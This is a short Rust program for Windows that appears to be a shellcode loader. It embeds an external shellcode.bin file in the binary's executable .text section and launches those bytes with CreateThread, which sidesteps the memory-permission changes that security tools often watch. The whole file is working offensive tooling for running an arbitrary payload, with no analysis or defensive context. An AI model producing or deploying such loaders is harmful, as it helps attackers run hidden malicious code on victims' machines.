use std::{mem::transmute, ptr::null_mut};

use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();

#[unsafe(no_mangle)]
#[unsafe(link_section = ".text")]
static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");

fn main() {
    let shellcode_ptr = SHELLCODE.as_ptr() as *mut std::ffi::c_void;

    unsafe {
        let mut thread_id: u32 = 0;
        let thread_handle = CreateThread(
            null_mut(),
            0,
            transmute(shellcode_ptr),
            null_mut(),
            0,
            &mut thread_id,
        );
        if thread_handle.is_null() {
            println!("Failed to create thread");
        }

        println!("Thread created with ID: {}", thread_id);

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }

    return;
}
